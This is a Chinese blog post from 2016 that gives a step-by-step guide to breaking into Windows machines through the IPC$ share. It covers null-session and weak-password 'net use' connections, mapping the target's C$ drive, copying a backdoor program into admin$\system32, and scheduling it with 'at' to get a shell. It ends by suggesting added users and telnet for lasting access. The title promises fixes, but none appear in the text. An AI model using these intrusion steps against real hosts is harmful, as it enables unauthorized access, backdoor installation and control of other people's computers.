---
title: $IPC连接
date: 2016-10-21 21:30:38
tags: tech
---


$IPC漏洞是常用的入侵windows2000/NT/XP/7/8/8.1/10的手段，在windows2000/NT/XP上直接通行无阻，在windows7以上版本取得弱密码后也能成功控制目标。这个漏洞是最常见的远程非社会工程学入侵手段
<!--more-->

# 关于windows $IPC漏洞的应用及解决办法
## 什么是$IPC漏洞

$IPC漏洞是一个在windows操作系统上面的常见漏洞
目前为止所有windows桌面版本中默认开启$IPC管道服务
$IPC漏洞是常用的入侵windows2000/NT/XP/7/8/8.1/10的手段，在windows2000/NT/XP上直接通行无阻，但在windows7及以上版本需要用“流光 Fluxary”等工具扫描出管理员弱密码才能取得权  

---

## 如何利用$IPC漏洞入侵
提前说一句，这个漏洞不大，要扩大漏洞的话，还要自己再开辟shell哦，可以自己打开telnet服务，也可以使用后门工具
### $IPC命令简介
#### 连接主机
如果不知道目标主机的用户名和密码就只能用空连接 
> net use \\\目标ip\$IPC "" /user：""

如果知道一个用户名和密码就更好了，很多人都会用"admin"用户名和空密码
我们举一个例子，用户名admin，密码1234
建立连接
> net use \\\目标ip\$IPC "1234" /user："admin"


#### 映射硬盘或文件夹
同样以用户名admin，密码1234为例
> net use z: \\\目标ip\c$ "1234" /user:"admin"      (这样就可以将目标的c盘映射为自己的z盘，其他的类似)


如果已经和目标建立了$IPC连接，则可以直接用IP+盘符+$访问
> net use z: \\\目标ip\c$


#### 删除$IPC连接
> net use \\\目标ip\$IPC  /del


#### 查看目标主机共享资源
> net view \\\目标ip\



---

### 普通入侵方式
#### 建立连接
建议用工具先获得管理员密码，否则在windows7以上版本会权限不够
#### 开启telnet服务或上传后门程序运行
找一个后门程序srv.exe（流光软件里有）
> copy srv.exe \\\目标ip\admin$\system32

然后设置定时运行

> at xx:xx:xx

这就建立了一个shell，相当于自己就在用目标机器上的命令行啦  
当然，为了可以持续访问，可以添加用户，开启telnet服务
